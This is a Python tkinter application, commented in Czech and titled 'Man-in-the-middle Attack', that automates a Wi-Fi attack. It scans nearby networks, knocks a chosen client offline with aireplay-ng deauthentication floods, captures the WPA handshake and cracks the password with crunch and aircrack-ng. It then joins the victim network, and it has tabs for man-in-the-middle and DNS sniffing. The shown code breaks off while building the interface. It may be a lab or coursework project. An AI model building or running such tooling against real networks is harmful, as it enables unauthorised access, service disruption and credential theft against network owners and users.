import subprocess
import tkinter as tk
from tkinter import ttk
from tkinter import scrolledtext
from tkinter import *
from tkinter import filedialog
import re
from threading import Thread
import time
import signal
import os
import csv
#import pandas as pd

# ========================================================================================================================
# Globální proměnná s názvem interface pro monitorovací mód
interface = ""

# Globální proměnné nutné pro připojení k síti:
# Název sítě (net), MAC adresa Access Pointu (ap), MAC adresa klienta (cl), Kanál, na kterém se vysílá (ch), Heslo pro připojení (password)
net = ""
ap = ""
cl = ""
ch = ""
password = ""

# Globální proměnná pro uchování reference na nekončící procesy pro jejich pozdější ukončení
airodump_process = None
airodump_client_process = None
deauth_process = None
aircrack_process = None
# Globální flag pro ukončení threadu se čtením ze souboru TODO jakého souboru? přejmenovat!
stop_reading_file = False

# Pomocná proměnná, pomocí které vypisuju výstup z airodump an stdout.... asi špatně používaná TODO delete
capture = None

# Názvy výstupních a pomocných souborů
output_airodump = "out_airdump"
output_handshake = "out_handshake"
output_handshake_only = "eapol_only.cap"    # Tohle přece nepotřebuju...
output_password = "password.txt"

# Uklidím případný soubor output_airodump-01.csv po předešlém spuštění
file_name = output_airodump + "-01.csv"
if os.path.isfile(file_name):
    os.remove(file_name)

# Uklidím případný soubor output_handshake-01.csv po předešlém spuštění
#file_name = output_handshake + "-01.csv"
#if os.path.isfile(file_name):
#    os.remove(file_name)

files_in_current_dir = os.listdir('.')

# Filter files that start with the prefix
files_to_delete = [file for file in files_in_current_dir if file.startswith(output_handshake)]

# Delete the filtered files
for file in files_to_delete:
    os.remove(file)

file_name = output_handshake_only
if os.path.isfile(file_name):
    os.remove(file_name)


# ========================================================================================================================
# ==== T1 ================================================================================================================
def find_wifi_interfaces():
    # Clear the text area
    interfaces_field.delete(0, tk.END)
    
    try:
        # Run the iwconfig command
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        output = result.stdout

        # Parse the output to extract interface names
        interfaces = []
        for line in output.split('\n'):
            if line and not line.startswith(' '):  # Check if line starts with interface name
                interface_name = line.split()[0]  # Extract interface name
                interface_mac = get_mac_address(interface_name) # Gets MAC address for the interface
                interfaces_field.insert(tk.END, interface_name + " (" + interface_mac + ")")
    except Exception as e:
        interfaces_field.insert(f"Failed to run iwconfig: {e}")
# ========================================================================================================================
def interfaces_on_select(event):
    global interface
    interface = interfaces_field.get(ANCHOR).split()[0]
    #print(f"Interface po selectu: {interface}")
    #interface_label.config(text=interfaces_field.get(ANCHOR).split()[0])
    status.config(text=interfaces_field.get(ANCHOR).split()[0])
    monitor_on_button.configure(state=NORMAL)
# ========================================================================================================================
# ========================================================================================================================
def start_monitor_mode():
    print(f"Interface v airmonu_on: {interface}")
    try:
        # Deaktivujte rozhraní
        subprocess.run(['ifconfig', interface, 'down'], check=True)
        # Vypne konfliktni procesy
        subprocess.run(['airmon-ng', 'check', 'kill'], check=True)
        # Nastavte monitorovací mód
        subprocess.run(['airmon-ng', 'start', interface], check=True)
        # Restartuji službu NetworkManager
        subprocess.run(['service', 'NetworkManager', 'restart'], check=True)
        #monitor_label.config(text=f"Rozhraní {interface} bylo úspěšně přepnuto do monitorovacího módu.")
        status.config(text=f"Rozhraní {interface} bylo úspěšně přepnuto do monitorovacího módu.")
        print(f"Rozhraní {interface} bylo úspěšně přepnuto do monitorovacího módu.")

        monitor_off_button.configure(state=NORMAL) 
        monitor_on_button.configure(state=DISABLED)
        airodump_on_button.configure(state=NORMAL) 

    except subprocess.CalledProcessError as e:
        #monitor_label.config(text=f"Chyba při nastavování monitorovacího módu: {e}")
        status.config(text=f"Chyba při nastavování monitorovacího módu: {e}")
        print(f"Chyba při nastavování monitorovacího módu: {e}")
# ========================================================================================================================
def stop_monitor_mode():
    print(f"Interface v airmonu_off: {interface}")
    try:
        # Deaktivujte rozhraní
        subprocess.run(['ifconfig', interface, 'down'], check=True)
        # Nastavte monitorovací mód
        subprocess.run(['airmon-ng', 'stop', interface], check=True)
        # Restartuji službu NetworkManager
        subprocess.run(['service', 'NetworkManager', 'restart'], check=True)
        status.config(text=f"Rozhraní {interface} bylo úspěšně přepnuto do normálního módu.")
        print(f"Rozhraní {interface} bylo úspěšně přepnuto do normálního módu.")

        monitor_on_button.configure(state=NORMAL) 
        monitor_off_button.configure(state=DISABLED) 

    except subprocess.CalledProcessError as e:
        status.config(text=f"Chyba při nastavování normálního módu: {e}")
        print(f"Chyba při nastavování normálního módu: {e}")
# ========================================================================================================================
def get_mac_address(iface):
    """Retrieve the MAC address of a given network interface by parsing the output of the ifconfig command."""
    try:
        # Execute the ifconfig command for the specified interface
        result = subprocess.run(["ifconfig", iface], capture_output=True, text=True, check=True)
        output = result.stdout

        # Regular expression to match a MAC address
        mac_regex = r"ether ([\da-fA-F:]{17})"
        match = re.search(mac_regex, output)

        if match:
            return f"{match.group(1)}"
            #return f"The MAC address of {iface} is {match.group(1)}"
        else:
            return "ERROR: MAC address not found."

    except subprocess.CalledProcessError:
        return "Failed to execute ifconfig. Make sure the command exists and the interface name is correct."
# ======================================================================================================================== 
# Spustí příkaz airodump-ng na zvoleném interfacu v samostatném procesu a výsledek zapisuje do souboru
def start_airodump_full():
    global airodump_process
    global capture

    airodump_on_button.configure(state=DISABLED) 
    airodump_off_button.configure(state=NORMAL) 

    #airodump_off_button.configure(status=NORMAL)
    command = f"sudo airodump-ng {interface} -w {output_airodump} --output-format csv"
    #airodump_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
    airodump_process = subprocess.Popen(command, shell=True, stdout=capture, stderr=subprocess.PIPE, preexec_fn=os.setsid)
    # Spustí zpracovávání souboru v samostatném vlákně
    print("-- Spuštím vlákno process_csv...")
    Thread(target=process_csv, daemon=True).start()
# ========================================================================================================================
# Funkce pro ukončení airodump-ng
def stop_airodump_full():
    print("-- Ukončuji airodump.")
    airodump_off_button.configure(state=DISABLED) 
    airodump_on_button.configure(state=NORMAL) 

    if airodump_process:
        os.killpg(os.getpgid(airodump_process.pid), signal.SIGTERM)
        print("  -- Airodump-ng byl ukončen.")
    print("-- Ukončuji zpracovávání CSV souboru.")
    global stop_reading_file
    stop_reading_file = True
    #print("Čtení ze souboru bylo ukončeno.")
# ========================================================================================================================
# Funkce pro načtení csv souboru a jeho následné zpracování
def process_csv():
    print("-- Začínám zpracovávat CSV.")

    global stop_reading_file
    global output_airodump
    output_airodump = output_airodump+"-01.csv"
    while True:
        # Krátká pauza, aby se nezatěžoval systém a aby se poprvé stihnul vytvořit soubor csv
        time.sleep(1)
        try:
            if not os.path.isfile(output_airodump):
                status.configure(text="Žádný CSV soubor není zatím vytvořený...")
                continue

            # Open the input file
            with open(output_airodump, 'r', encoding='utf-8') as file:
                lines = file.readlines()
            # Remove the first empty line
            lines = lines[1:]
    
            # Find the index of the empty line separating the two blocks
            try:
                separator_index = lines.index('\n')
                # Split the lines into two blocks
                aps_lines = lines[:separator_index]
                clients_lines = lines[separator_index+1:]  # Skip the empty line
                # Odstraním prázdný řádek na konci
                clients_lines.pop()
            except ValueError:
                print("No separator found. Make sure there's an empty line between the blocks.")
                aps_lines = lines[:]
                clients_lines = []

            for item in tree_ap.get_children():
                tree_ap.delete(item)
            for item in tree_cl.get_children():
                tree_cl.delete(item)

            try:
                reader = csv.reader(aps_lines)
                headers = next(reader)
            
                # Odstranim mezery v retezcich
                headers = [header.replace(" ", "") for header in headers]

                # Vyselektuji jen relevantní sloupce kvůli přehlednosti:
                # Access Points: BSSID [0], channel [3], Privacy [5], Authentication [7], ESSID [13]
                selected_columns = [0, 3, 5, 7, 13]
                selected_headers = [headers[i] for i in selected_columns if i < len(headers)]

                tree_ap["columns"] = selected_headers
                # Nastavim sirku sloupcu, aby to bylo citelnejsi:
                tree_ap.column("#1", width=200, minwidth=40)    # BSSID WTF tohle nefunguje?
                tree_ap.column("#2", width=70, minwidth=20)     # channel
                tree_ap.column("#3", width=100, minwidth=45)    # Privacy
                tree_ap.column("#4", width=120, minwidth=100)   # Authentication
                tree_ap.column("#5", width=250, minwidth=100)   # ESSID
                tree_ap["show"] = "headings"

                for header in selected_headers:
                    tree_ap.heading(header, text=header)
                    tree_ap.column(header, anchor='center')

                for row in reader:
                    selected_row = [row[i] for i in selected_columns if i < len(row)]
                    tree_ap.insert('', tk.END, values=selected_row)
            except Exception as e:
                print(f"An error occurred: {e}")

            try:
                reader = csv.reader(clients_lines)
                headers = next(reader)

                # Odstranim mezery v retezcich
                headers = [header.replace(" ", "") for header in headers]

                # Access Points: BSSID [0], channel [3], Privacy [5], Authentication [7], ESSID [13]
                # Clients: Station MAC [0], BSSID [5], Probed ESSIDs [6]  
                selected_columns = [0, 5, 6]
                selected_headers = [headers[i] for i in selected_columns if i < len(headers)]

                tree_cl["columns"] = selected_headers
                # Nastavim sirku sloupcu, aby to bylo citelnejsi:
                tree_ap.column("#1", width=200, minwidth=100)   # Client MAC
                tree_ap.column("#2", width=200, minwidth=100)   # BSSID
                tree_ap.column("#5", width=250, minwidth=100)   # probed ESSID
                tree_cl["show"] = "headings"

                for header in selected_headers:
                    tree_cl.heading(header, text=header)
                    tree_cl.column(header, anchor='center')

                for row in reader:
                    selected_row = [row[i] for i in selected_columns if i < len(row)]
                    tree_cl.insert('', tk.END, values=selected_row, tags=selected_row[1])

            except Exception as e:
                print(f"An error occurred: {e}")
        except FileNotFoundError:
            print("ERROR: při čtení ze souboru csv")

        if stop_reading_file:
            break
    print("  -- Vlákno zpracovávání CSV bylo ukončeno.")
# ========================================================================================================================
def tree_ap_selected(Event):
    # Get selected item(s) on treeview_a
    selected_items = tree_ap.selection()
    
    # Clear existing selections in treeview_b
    #tree_cl.selection_remove(tree_cl.selection())
    
    # For simplicity, assuming 'BSSID' is in the first column (index 0)
    bssid_column_index = tree_ap["columns"].index("BSSID")

    selected_bssids = []
    for item in selected_items:
        # Get the BSSID value of the selected row in treeview_a
        item_values = tree_ap.item(item, "values")
        bssid_value = item_values[bssid_column_index]
        status.configure(text=bssid_value) 
        #print("Vybral jsem " + bssid_value + " v seznamu AP") # DEBUGG
        selected_bssids.append(bssid_value)
    
    #bssid_column_index = tree_cl["columns"].index("BSSID")
    # 1 je index BSSID v treeview clientů
    bssid_column_index = 1

    for item in tree_cl.get_children():
        cur_tag = tree_cl.item(item)['tags']
        tree_cl.tag_configure(cur_tag,background='white')

    # Obravim dobrej tag na zeleno
    tree_cl.tag_configure(selected_bssids[0].strip(),background='green')
# ========================================================================================================================
def find_channel_by_bssid(bssid):
    """
    Najde hodnotu sloupce 'channel' pro řádek se zadaným 'BSSID' v Treeview.
    
    :param bssid: hodnota 'BSSID', kterou chceme najít
    :return: hodnota 'channel' nebo None, pokud není 'BSSID' nalezeno
    """
    # První sloupec (index 0) je 'BSSID' a druhý sloupec (index 1) je 'channel'
    bssid_column_index = 0  
    channel_column_index = 1  
    bssid = bssid[1:]
    # Procházení všech řádků v tree_ap
    for child in tree_ap.get_children():
        # Získání hodnot pro daný řádek
        row_values = tree_ap.item(child, "values")
        # Kontrola, zda hodnota 'BSSID' odpovídá hledané
        if row_values[bssid_column_index] == bssid:
            # Nalezeno, vrátíme hodnotu 'channel'
            channel = row_values[channel_column_index]
            channel = channel[1:]
            return channel
    # Pokud 'BSSID' není nalezeno, vrátíme None
    return None 
# ========================================================================================================================
def find_net_by_bssid(bssid):
    """
    Najde hodnotu sloupce 'ESSID' pro řádek se zadaným 'BSSID' v Treeview.
    
    :param bssid: hodnota 'BSSID', kterou chceme najít
    :return: hodnota 'ESSID' nebo None, pokud není 'BSSID' nalezeno
    """
    # První sloupec (index 0) je 'BSSID' a čtvrtý sloupec (index 4) je 'channel'
    bssid_column_index = 0  
    net_column_index = 4  
    bssid = bssid[1:]
    # Procházení všech řádků v tree_ap
    for child in tree_ap.get_children():
        # Získání hodnot pro daný řádek
        row_values = tree_ap.item(child, "values")
        # Kontrola, zda hodnota 'BSSID' odpovídá hledané
        if row_values[bssid_column_index] == bssid:
            # Nalezeno, vrátíme hodnotu 'channel'
            net = row_values[net_column_index]
            net = net[1:]
            return net
    # Pokud 'BSSID' není nalezeno, vrátíme None
    return None   
# ========================================================================================================================
def tree_cl_selected(Event):
    # Get selected item(s) on treeview_a
    selected_items = tree_cl.selection()

    # TODO if selection is empty, then return else celej ten zbytek
    item = selected_items[0]
    item_values = tree_cl.item(item, "values")

    global net
    global ap       
    global cl
    global ch

    net = str(find_net_by_bssid(item_values[1])).strip()
    ap = item_values[1].strip()
    cl = item_values[0].strip()
    ch = str(find_channel_by_bssid(item_values[1])).strip()

    target_net.configure(text=net)
    target_ap.configure(text=ap)
    target_cl.configure(text=cl)
    target_ch.configure(text=ch)
# ========================================================================================================================
# === T2 =================================================================================================================
def start_handshake_catch():
    # Zapnu pobihani progress baru u WPA handshake zachyceni
    handshake_catch_progress.start(10)

    #Příkaz shellu airmon-ng, který budu spouštět v samostatném vlákně
    command_catch_handshake = f"sudo airodump-ng -c{ch} -d {ap} -w {output_handshake} {interface}"


    # FOR TESTING ONLY!:
    #command_catch_handshake = f"sudo airodump-ng -c5 -d CC:2D:E0:C2:EE:6B -w out_handshake wlan1"

    print("===========================")
    print("START HANDSHAKE CATCHING...")
    print("COMMAND: " + command_catch_handshake)
    
    # Pro názornost vypíšu spouštěný příkaz do labelu
    handshake_command.configure(text=command_catch_handshake)

    # Nastavuji správně tlačítka
    handshake_catch_on_button.configure(state=DISABLED) 
    handshake_catch_off_button.configure(state=NORMAL) 

    # Spouštím process zachytávání handshaku na zvoleném rozhraní
    # TODO použití exception pro spuštění child processu
    global airodump_target_process
    global capture

    print(" - spuštím airodump na target")
    # TODO tady je zatím výstup na stdout - později změnit na PIPE
    #airodump_target_process = subprocess.Popen(command_catch_handshake, shell=True, stdout=capture, stderr=subprocess.PIPE, preexec_fn=os.setsid)
    airodump_target_process = subprocess.Popen(command_catch_handshake, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
    # Dám tomu čas na vytvoření souborů - možná netřeba TODO test
    print(" - airodump na target byl spuštěn")

    print(" - START parsovani " + output_handshake)
    global output_handshake_only
    print(" - Output file: "+ output_handshake_only)
    #tshark_command = f"tshark -r {output_handshake}-01.cap -n -Y \"eapol\" -w {output_handshake_only}"
    #print(" - COMMAND: " + tshark_command)

    print(" - Spouštím thread s parsováním .cap")
    Thread(target=parse_handshake_cap, daemon=True).start()
    print(" - Thread s parsováním byl spuštěn")

    """
    time.sleep(1)
    #detect_eapol()
    # parse_handshake_cap(tshark_command)
    """

    print("STOPPED HANDSHAKE CATCHING... (OND OF FUNCTION)")
    print("=============================")
# ========================================================================================================================
def stop_handshake_catch():
    # Zastavuji progress bar pro zachytavani handshaku
    handshake_catch_progress.stop()

    global airodump_target_process
    if airodump_target_process:
        os.killpg(os.getpgid(airodump_target_process.pid), signal.SIGTERM)
        print("  -- Process zachytávání handshaku byl ukončen.")

    # Nastavuji správně tlačítka
    handshake_catch_on_button.configure(state=NORMAL) 
    handshake_catch_off_button.configure(state=DISABLED) 
# ========================================================================================================================
def start_deauthentification():
    # Zapínám pohyb progress baru
    deauth_progress.start(10)

    #deauth_cadency = 0 nebo 10 ?
    # Testování funkčních hodnot ( --ignore-negative-one  )
    deauth_cadency = 0
    command_deauth = f"sudo aireplay-ng --deauth {deauth_cadency} --ignore-negative-one -D -c {cl} -a {ap} {interface}"
    #command_deauth = f"sudo aireplay-ng --deauth {deauth_cadency} --ignore-negative-one -D -c BC:1A:E4:92:5E:25 -a CC:2D:E0:C2:EE:6B wlan1"

    #Vypíšu pro názornost spouštěný příkaz
    deauth_command_label.configure(text=command_deauth)

    # Spouštím proces posílání deauthentifikačních rámců na klienta. Jeho PID si uložím pro pozdější zastavení
    # TODO tady na to nemusí být samostatný vlákno? ======================
    global deauth_process 
    deauth_process = subprocess.Popen(command_deauth, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)

    # Nastavuji správně tlačítka
    deauth_on_button.configure(state=DISABLED) 
    deauth_off_button.configure(state=NORMAL) 
# ========================================================================================================================
def stop_deauthentification():
    # Zastavuji process posílání deauth paketů
    global deauth_process
    if deauth_process:
        os.killpg(os.getpgid(deauth_process.pid), signal.SIGTERM)
        print("  -- Process posílání deauth rámců byl ukončen.")

    # Nastavuji správně tlačítka
    deauth_on_button.configure(state=NORMAL) 
    deauth_off_button.configure(state=DISABLED)

    # Zastavuji progress bar pro zachytavani handshaku
    deauth_progress.stop()
# ========================================================================================================================
def parse_handshake_cap():
    captured = False
    tshark_command = f"tshark -r {output_handshake}-01.cap -n -Y \"eapol\" -w {output_handshake_only}"
    #print("Začínám cyklus čtení wpa-good")
    print("     - Začínám cyklus čtení " + output_handshake)
    print("     - Captured: " + str(captured))
    print("     - Command: "+ tshark_command)
    print("     - Handshake only file: "+ output_handshake_only)


    #print("     - Handshake ještě nebyl zachycen a vjížím do while...")
    handshake_finished_label.config(text="Handshake ještě nebyl zachycen...", fg='grey')
    
    while not captured:
        try:
            tshark_process = subprocess.Popen(tshark_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
            time.sleep(1)  # Wait for 1 second before checking again
            #print("         ---testing---")
            #i = 0 
            #out, err = tshark_process.communicate()   
            #nlines = len(out.splitlines())
            #if nlines == 4:
            #    print("     - Captured i==4")

            #for line in out.split('\n'):
            #     i += 1
            # if i == 4:
            #     print("     - Captured i==4")

            #subprocess.run(tshark_command, shell=True, check=True)
            #with open(output_handshake_only, "r") as file:
            #    lines = file.readlines()
            if os.path.exists(output_handshake_only):
                file_size = os.path.getsize(output_handshake_only)
                if file_size >= 500:
                    handshake_finished_label.config(text="Handshake byl zachycen!", fg='green')
                    print("     - Captured >500")
                    captured = True

        except FileNotFoundError:
            status.config(text="File not found. Waiting...")
            print("     - No file to read...")
        # Kontroluji soubor každou sekundu
        pass
    print("     - Zachycen handshake, ukončuji vlakno.")
# =======================================================================================================================
def detect_eapol():
    #print("START parsovani wpa-good.")
    print("===========================")
    print("START parsovani " + output_handshake)
    global output_handshake_only
    print("Output file: "+ output_handshake_only)
    tshark_command = f"tshark -r {output_handshake}.cap -n -Y \"eapol\" -w {output_handshake_only}"
    print("Command: " + tshark_command)
    # Spustím to v samostatném vlákně

    # Tady to asi musí být ve vlákně, jinak se mi to sekne ve whilu
    # parse_handshake_cap(tshark_command) 
    Thread(target=parse_handshake_cap(tshark_command), daemon=True).start()
    #print("END parsovani " + output_handshake)
    print("Spustil jsem thread s parsovanim " + output_handshake + " a ukončuji tuto funkci")
# ========================================================================================================================
# ========================================================================================================================
def crunch(min, max, chars, output):
    command = f"crunch {min} {max} {chars} -o {output}"
    subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)

def create_wordlist():
    #global create_wl_progress
    create_wl_progress.grid(row=4,column=0,columnspan=4)
    create_wl_progress.start(10)
    min = wl_min_entry.get()
    max = wl_max_entry.get()
    chars = wl_char_entry.get()
    output = wl_name_entry.get()
    #print("after button: " + min + ", " + max + ", " + chars + ", " + output)
    # Je nutné to tady vůbec dávat do samostatného vlákna? TODO otestovat na obrovském souboru hesel....
    thr = Thread(target=crunch(min, max, chars, output), daemon=True)
    thr.start()
    thr.join()
    create_wl_progress.stop()
    create_wl_progress.grid_forget()
    status.config(text="Slovník hesel byl úspěšně vytvořen!")
    wordlist_name_label.config(text=os.getcwd()+"/"+output)
# ========================================================================================================================
def load_wordlist():
    root.filename = filedialog.askopenfilename(title="Zvol textový soubor se slovníkem hesel")  
    global wordlist_name
    wordlist_name = root.filename
    #print("Wordlist: "+wordlist_name) 
    wordlist_name_label.config(text=wordlist_name)
    load_wordlist_frame.config(background="green")      # TADY JE TO OK !!!!!!!!!!!!!!!!!
    crack_pw_frame.config(highlightbackground="green")  # TADY JE TO OK !!!!!!!!!!!!!!!!!
# ========================================================================================================================
# ========================================================================================================================
def secs_to_str(seconds):
        """Human-readable seconds. 193 -> 3m13s"""
        if seconds < 0:
            return '-%ds' % seconds

        rem = int(seconds)
        hours = rem // 3600
        mins = int((rem % 3600) / 60)
        secs = rem % 60
        if hours > 0:
            return '%dh%dm%ds' % (hours, mins, secs)
        elif mins > 0:
            return '%dm%ds' % (mins, secs)
        else:
            return '%ds' % secs
# ========================================================================================================================
def aircrack(capfile, wordlist):
    command = f"aircrack-ng {capfile} -w {wordlist}"
    global aircrack_process
    aircrack_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
    #grep_aircrack_process()
# ========================================================================================================================
def grep_aircrack_process():
    # Report progress of cracking
    aircrack_nums_re = re.compile(r'(\d+)/(\d+) keys tested.*\(([\d.]+)\s+k/s')
    aircrack_key_re = re.compile(r'Current passphrase:\s*(\S.*\S)\s*$')
    num_tried = num_total = 0
    percent = num_kps = 0.0
    eta_str = 'unknown'
    current_key = ''
    while aircrack_process.poll() is None:
        line = aircrack_process.stdout.readline()
        match_nums = aircrack_nums_re.search(line.decode('utf-8'))
        match_keys = aircrack_key_re.search(line.decode('utf-8'))
        if match_nums:
            num_tried = int(match_nums[1])
            num_total = int(match_nums[2])
            num_kps = float(match_nums[3])
            eta_seconds = (num_total - num_tried) / num_kps
            eta_str = secs_to_str(eta_seconds)
            percent = 100.0 * float(num_tried) / float(num_total)
        elif match_keys:
            current_key = match_keys[1]
        else:
            continue

        progress = 'Lámání WPA Handshaku: %0.2f%%' % percent
        progress += ' ETA: %s' % eta_str
        progress += ' (aktuální klíč: %s)' % current_key
        crack_pw_progress['value']=int(percent)
        crack_pw_current_line_label.config(text=progress)

        if not os.path.isfile(output_password):
            status.configure(text="Heslo nebylo prolomeno...")
            return

    # Vypíšu nalezené heslo do odpovídajícího labelu
    with open(output_password, 'r', encoding='utf-8') as file:
        global password
        password = file.readline()
        password_label.config(text=password)

    # Ukončím běhání progress baru
    print("Konec lámání hesla!")
    crack_pw_progress.stop()
    crack_pw_progress.grid_forget()
# ========================================================================================================================
def crack_pw():
    crack_pw_progress.grid(row=3,column=0,columnspan=3, sticky=EW)
    status.config(text="Lámání hesla")

    #capfile = "wpa-good.cap"        # TODO změnit na fungující hovno !!!!!!!!!!!!!!!!
    capfile = output_handshake + "-01.cap"
    command = f"aircrack-ng {capfile} -w {wordlist_name} -l {output_password}"
    print("==================")
    print("COMMAND: "+command)
    global aircrack_process
    aircrack_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
    Thread(target=grep_aircrack_process, daemon=True).start()
    # TODO check jestli se tohle nezobrazí dřív, než doběhne lámání helsa
    status.config(text="Heslo bylo úspěšně prolomeno!")

# ========================================================================================================================
# ========================================================================================================================
def connect_to_wifi():
    try:
        # Deaktivujte rozhraní
        subprocess.run(['ifconfig', interface, 'down'], check=True)
        # Zastavit monitorovací mód
        subprocess.run(['airmon-ng', 'stop', interface], check=True)
        # Restartuji službu NetworkManager
        subprocess.run(['service', 'NetworkManager', 'restart'], check=True)
        
        print(f"Rozhraní {interface} bylo úspěšně přepnuto do normálního módu.")
        
        global net
        global password
        #global interface
        command = f"nmcli wifi connect {net} password {password} ifname {interface}"

        print("COMMAND: " + command)
        # Připojení se k Wi-Fi síti
        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)

        status.config(text=f"Úspěšně připojeno k cílové Wi-fi síti!")
        connect_button.configure(state=DISABLED) ########################################################################

    except subprocess.CalledProcessError as e:
        status.config(text=f"Chyba při npřipojování k síti: {e}")
        print(f"Chyba při připojování k síti: {e}")

# ========================================================================================================================
# ========================================================================================================================
# Funkce pro změnu tabu
def change_tab(direction):
    current_tab = notebook.index(notebook.select())
    if direction == "next" and current_tab < notebook.index("end") - 1:
        notebook.select(current_tab + 1)
    elif direction == "prev" and current_tab > 0:
        notebook.select(current_tab - 1)
    update_button_state()
# ========================================================================================================================
# Aktualizace stavu tlačítek
def update_button_state():
    current_tab = notebook.index(notebook.select())
    btn_prev['state'] = tk.NORMAL if current_tab > 0 else tk.DISABLED
    btn_next['state'] = tk.NORMAL if current_tab < notebook.index("end") - 1 else tk.DISABLED
# ========================================================================================================================
# Funkce pro ukončení aplikace při stisku CTRL+C
def destroyer(event):
    root.destroy()
    print('Končím po stiskuní CTRL + C')
# ========================================================================================================================================
# Create the main window =================================================================================================================
# ========================================================================================================================================
root = tk.Tk()
root.title("Man-in-the-middle Attack")
icon = PhotoImage(file='sword.png')   
root.tk.call('wm', 'iconphoto', root._w, icon)
root.geometry("1500x1000")

# Registrace signal handleru pro SIGINT pro ukončení airodump-ng pomocí CTRL+C
root.bind_all('<Control-c>', destroyer)

# Frame pro notebook a navigační tlačítka, aby bylo možné lépe kontrolovat layout =======================================================
main_frame = tk.Frame(root)
main_frame.pack(expand=True, fill='both')

# Vytvoření panelu s taby
notebook = ttk.Notebook(main_frame)

tab1 = ttk.Frame(notebook)
tab2 = ttk.Frame(notebook)
tab3 = ttk.Frame(notebook)
tab4 = ttk.Frame(notebook)
tab5 = ttk.Frame(notebook)

notebook.add(tab1, text="Vyhledání cílů")
notebook.add(tab2, text="Záchyt handshaku")
notebook.add(tab3, text="Prolomení hesla")
notebook.add(tab4, text="Man-in-the-middle")
notebook.add(tab5, text="Odposlech DNS dotazů")
frame_t1 = Frame(tab1)
frame_t2 = Frame(tab2)
frame_t3 = Frame(tab3)
frame_t4 = Frame(tab4)
frame_t5 = Frame(tab5)
frame_t1.pack(fill='both', expand=True)
frame_t2.pack(fill='both', expand=True)
frame_t3.pack(fill='both', expand=True)
frame_t4.pack(fill='both', expand=True)
frame_t5.pack(fill='both', expand=True)
frame_t1.pack_propagate(0)
frame_t2.pack_propagate(0)
frame_t3.pack_propagate(0)
frame_t4.pack_propagate(0)
frame_t5.pack_propagate(0)

# Tlačítka pro navigaci
btn_prev = ttk.Button(main_frame, text="<<", command=lambda: change_tab("prev"))
btn_prev.pack(side=tk.LEFT, fill='y')

notebook.pack(side=tk.LEFT, expand=True, fill='both')

btn_next = ttk.Button(main_frame, text=">>", command=lambda: change_tab("next"))
btn_next.pack(side=tk.RIGHT, fill='y')

# Inicializace stavu tlačítek
update_button_state()

# Tab "Vyhledání cílů" ==================================================================================================================
# Interface frame ========================================================================
interface_frame = LabelFrame(frame_t1, text="Vyhledání a výběr požadovaného rozhraní", borderwidth=4)
interface_frame.pack_propagate(0)
interface_frame.pack(padx=10,pady=5, fill=X, expand=True, side=TOP)

# Create a button to run iwconfig command
interface_button = tk.Button(interface_frame, text="Najít Wi-fi rozhraní", width=20, command=find_wifi_interfaces)
interface_button.grid(row=0, column=0, sticky=N, padx=5, pady=5)

# Create a scrolled text area widget
interfaces_field = tk.Listbox(interface_frame, width=30, height=3)  # Adjusted size for interface names
interfaces_field.bind('<<ListboxSelect>>', interfaces_on_select)
interfaces_field.grid(row=0, column= 1, pady=5)

# Monitor mode frame ========================================================================
monitor_frame = LabelFrame(frame_t1, text="Přepnutí rozhraní do monitorovacího módu", borderwidth=4)
monitor_frame.pack(padx=10,pady=5, fill='x')

monitor_on_button = tk.Button(monitor_frame, text="Spustit monitorovací mód", width=20, state=DISABLED, command=start_monitor_mode)
monitor_off_button = tk.Button(monitor_frame, text="Vypnout monitorovací mód", width=20, state=DISABLED, command=stop_monitor_mode)
monitor_on_button.grid(row=0, column=0, padx=5, pady=5)
monitor_off_button.grid(row=0, column=1, pady=5)

# Airodump frame ========================================================================
airodump_frame = LabelFrame(frame_t1, text="Záchyt komunikace v okolí", borderwidth=4)
airodump_frame.pack(padx=10,pady=5, fill='x', expand=True)

airodump_on_button = tk.Button(airodump_frame, text="Spustit airodump-ng", width=20, state=DISABLED, command=lambda: Thread(target=start_airodump_full).start())
airodump_off_button = tk.Button(airodump_frame, text="Zastavit airodump-ng", width=20, state=DISABLED, command=stop_airodump_full)
airodump_on_button.grid(row=0, column=0,  sticky=W, padx=5, pady=5)
airodump_off_button.grid(row=0, column=1, sticky=W, pady=5)

# Treeview pro Access Pointy
tree_ap_label = Label(airodump_frame, text="Seznam Access Pointů")
tree_ap_label.grid(row=1, column=0, columnspan=4)

tree_ap = ttk.Treeview(airodump_frame, selectmode='browse')
tree_ap.bind('<<TreeviewSelect>>', tree_ap_selected)
tree_ap.grid(row=2, column=0, columnspan=3, sticky=EW, padx=5, pady=5)

scrollbarv_ap = ttk.Scrollbar(airodump_frame, orient="vertical", command=tree_ap.yview)
scrollbarv_ap.grid(row=2, column=3,sticky=NS, pady=5)
tree_ap.configure(yscrollcommand=scrollbarv_ap.set)

# Treeview pro Clienty
tree_cl_label = Label(airodump_frame, text="Seznam klientů")
tree_cl_label.grid(row=3, column=0, columnspan=4)

tree_cl = ttk.Treeview(airodump_frame, selectmode='browse')
tree_cl.bind('<<TreeviewSelect>>', tree_cl_selected)
tree_cl.grid(row=4, column=0, columnspan=3, sticky=EW, padx=5, pady=5)

scrollbarv_cl = ttk.Scrollbar(airodump_frame, orient="vertical", command=tree_cl.yview)
scrollbarv_cl.grid(row=4, column=3,sticky=NS, pady=5)
tree_cl.configure(yscrollcommand=scrollbarv_cl.set)

airodump_frame.grid_columnconfigure(2, weight=1)

# Target frame ========================================================================
target_frame = LabelFrame(frame_t1, text="Cíl MITM útoku", borderwidth=4)
target_frame.pack(padx=10,pady=5, fill='x', expand=True)

target_net_label = Label(target_frame, text="Cílová síť:", font=('Helvetica', 16))
target_ap_label = Label(target_frame, text="Cílový Access Point:", font=('Helvetica', 16))
target_cl_label = Label(target_frame, text="Cílové zařízení:", font=('Helvetica', 16))
target_ch_label = Label(target_frame, text="Kanál komunikace:", font=('Helvetica', 16))
